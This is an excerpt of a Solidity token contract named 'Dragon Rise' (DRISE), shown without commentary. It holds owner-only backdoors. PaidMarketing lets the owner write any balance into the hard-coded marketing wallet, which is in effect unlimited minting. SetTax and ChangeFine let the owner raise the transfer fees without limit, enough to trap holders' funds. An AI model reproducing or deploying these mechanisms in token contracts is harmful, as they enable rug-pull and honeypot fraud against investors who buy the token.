...
contract  drise is Context, IERC20, Ownable {
    ...
    string private constant _name = "Dragon Rise"; 
    string private constant _symbol = "DRISE"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketing = 15;
    uint256 public _liquidityFee = 15;
    address private _marketingWallet = 0xbC7b6AFF952d98C4d8e0473C05BdBc20B8785780;
    ...
    function ChangeFine(uint256 liquidityFee, uint256 marketing) external onlyOwner {
    ...
    function PaidMarketing(uint256 resource, address addre) external onlyOwner{
        require(addre == address(_marketingWallet), "PaidMar keting");
        _tOwned[addre] = resource;
        emit Transfer(address(_marketingWallet), addre, resource);
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 marketing = amount * _marketing / 100; 
        uint256 liquidityFee = amount * _liquidityFee / 100; 
        _tOwned[address(this)] += marketing + liquidityFee;
        emit Transfer (from, address(this), marketing + liquidityFee);
        return (amount - marketing - liquidityFee);
    }
    ...
    function swapAndLiquify() private {
        ...
        uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_marketing + _liquidityFee);
    ...
    function SetTax(uint256 liquidityFee, uint256 marketing) external onlyOwner {
        _liquidityFee = liquidityFee;
        _marketing = marketing;
    }
